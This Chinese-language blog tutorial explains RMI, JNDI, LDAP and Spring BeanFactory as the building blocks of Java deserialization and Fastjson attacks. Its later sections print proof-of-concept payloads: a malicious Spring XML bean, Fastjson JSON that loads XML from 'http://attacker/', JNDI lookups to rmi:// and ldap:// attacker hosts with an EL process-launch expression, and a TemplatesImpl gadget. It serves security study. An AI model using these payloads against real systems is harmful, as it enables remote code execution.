---
title: Java反序列化漏洞核心组件
author: Creexile
date: 2025-07-25 13:07:04
lastMod: 2025-12-12
summary: '如果你在美术学院挂科, 我们可能会询问你对政治是否感兴趣'
cover: ''
category: 'Java安全'
draft: false
comments: false
sticky: 0
tags: [Java, 代码审计]
---

**RMI/JNDI/LDAP/BeanFactory**

# RMI

RMI(Remote Method Invocation), Java提供的**远程方法调用**机制，支持跨 JVM 的对象通信(一个JVM中的对象调用另一个JVM中的对象方法)

## 核心特性

- **分布式通信**：实现跨网络的方法调用
- **动态类加载**：支持从远程 URL 加载类文件（漏洞关键点）
- **RMI Registry**：中央注册服务（默认端口 1099），管理远程对象引用

## 利用方式

1. 攻击者搭建RMI服务器和HTTP服务器托管恶意class
2. 靶机向RMI服务器查询恶意对象
3. 服务器返回一个指向恶意class文件的Reference对象(指向HTTP服务器中的class文件)
4. 靶机向HTTP服务器请求加载恶意class, 服务器返回恶意字节码
5. 靶机实例化并执行恶意代码

# JNDI

JNDI 是 Java 平台的核心服务接口, 提供**统一的命名和目录访问能力**, 允许 Java 应用程序通过标准化 API 访问各种命名和目录服务

> JNDI 本质是设计良好的服务集成框架, 漏洞源于早期版本对动态类加载的安全控制不足

## 核心概念

| 概念     | 说明                                                     |
| -------- | -------------------------------------------------------- |
| 命名服务 | 名称→对象的映射（类似 DNS），核心操作: `bind()/lookup()` |
| 目录服务 | 增强版命名服务，支持对象+属性管理（如 LDAP)              |

### 命名服务 (Naming Service)

核心功能：将名称 (Name) 绑定到对象 (Object), 类似电话簿（名称→电话号码）或 DNS（域名→IP）

关键操作：

- `bind()`：将名称绑定到对象
- `lookup()`：通过名称查找对象
- `rebind()`：重新绑定
- `unbind()`：解除绑定

### 目录服务 (Directory Service)

- 扩展功能：在命名服务基础上增加**属性管理**
- 特点：对象可附带属性（如用户对象包含邮箱/部门等）

## JNDI 架构分层

![](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/202507251039.png)

### 应用层 (JNDI API)

开发者使用的统一接口 `javax.naming.*`

示例代码：

```java
Context ctx = new InitialContext();
DataSource ds = (DataSource) ctx.lookup("java:comp/env/jdbc/mydb");
```

### 服务提供层 (SPI)

协议适配器：将 JNDI API 映射到具体服务

常见提供者：
`rmi`: → RMI 协议
`ldap`: → LDAP 协议
`dns`: → DNS 查询
`file`: → 文件系统

### 底层服务

实际的服务实现（如 OpenLDAP、RMI Registry）

## 关键组件

| 组件           | 说明                                  |
| -------------- | ------------------------------------- |
| InitialContext | JNDI 入口点，通过环境配置连接服务     |
| Context        | 核心接口，提供命名操作 (lookup/bind)  |
| Reference      | 对象的间接引用 (包含类名+工厂类+地址) |
| NamingManager  | 管理对象工厂的创建过程                |
| ObjectFactory  | 工厂接口，将 Reference 转换为实际对象 |

## JNDI注入原理

![](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/202507251017.png)

**漏洞触发条件**：

1. 应用执行`lookup()`时使用外部可控参数
2. JDK 版本 < 8u191（默认允许远程类加载）
3. 存在危险工厂类（如 `BeanFactory`）

## 安全演进与防护

| JDK 版本 | 安全改进                                       |
| -------- | ---------------------------------------------- |
| ≤8u121   | 无防护，可直接利用                             |
| 8u121+   | 限制 RMI 远程类加载 ( trustURLCodebase=false ) |
| 8u191+   | 默认禁用所有协议的远程类加载                   |
| 11.0.1+  | 完全移除 RMI Reference 的远程类加载能力        |

# LDAP

LDAP是轻量级目录访问协议, 用于访问和维护分布式目录信息服务(如用户身份信息、组织架构等)

## 与JNDI的关系

- JNDI 通过 `ldap://` 协议支持 LDAP 访问
- LDAP 条目可存储 Java 对象引用（ `javaSerializedData` 或 `javaReferenceAddress` ）
- 可作为JNDI注入的替代载体
- 替代 RMI 成为高版本 JDK 的首选攻击载体

| 特性       | RMI        | LDAP         |
| ---------- | ---------- | ------------ |
| 协议端口   | 1099       | 389/636      |
| 响应速度   | 较慢       | 较快         |
| JDK限制    | 8u121+受限 | 8u191+受限   |
| 利用复杂度 | 简单       | 需配置schema |

# BeanFactory

BeanFactory (Spring框架核心)

Spring 框架的**容器核心**，管理 Bean 的生命周期和依赖注入。

## 关键能力

- Bean的创建、配置、组装
- 依赖注入（DI）实现
- 支持多种Bean作用域（singleton/prototype等）

## 漏洞利用

在高级Fastjson漏洞利用中，攻击者可能利用Spring相关类：

1. 通过特殊Bean触发危险行为（如 `org.springframework.context.support.ClassPathXmlApplicationContext` 加载恶意XML）
2. 利用 `BeanFactory` 的反射能力执行代码

下面是一个加载恶意XML的例子

- 高危类： `ClassPathXmlApplicationContext`
- 利用原理：加载恶意 XML 配置文件实现 RCE

```xm
<!-- 恶意 spring.xml -->
<bean id="malicious" class="java.lang.ProcessBuilder">
    <constructor-arg value="calc.exe"/>
    <property name="whatever" value="#{malicious.start()}"/>
</bean>
```

- 触发方式

```
{
   "@type": "org.springframework.context.support.ClassPathXmlApplicationContext",
   "configLocation": "http://attacker/malicious.xml"
}
```

# 绕过

## 高版本JDK绕过

当目标 JDK ≥ 8u191（禁用远程类加载）时：

### 绕过方案 1：利用本地 ClassPath 中的 Gadget

```java
// 查找目标应用中已有的危险类
TypeFactory.loadClass("org.apache.xbean.propertyeditor.JndiConverter");
ctx.lookup("rmi://attacker/controlled"); // 触发本地类的方法
```

### 绕过方案 2：EL 表达式注入 (Tomcat 环境)

```java
// 利用 javax.el.ELProcessor
String payload = "{''.getClass().forName('javax.script.ScriptEngineManager')"
               + ".newInstance().getEngineByName('JavaScript')"
               + ".eval('new java.lang.ProcessBuilder(\"calc\").start()')}";
ctx.lookup("ldap://attacker/" + URLEncoder.encode(payload));
```

### 绕过方案 3：反序列化 Gadget 链

结合本地存在的 CC/ROME 等链：

```json
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["yv66vgAA...恶意字节码..."],
  "_name": "pwn",
  "_tfactory": {}
}
```

# 总结

关键路径：

1. 恶意json构造让Fastjson解析
2. 调用危险方法执行JNDI lookup
3. 利用RMI或LDAP协议返回Reference加载远程恶意类
4. 最后系统执行
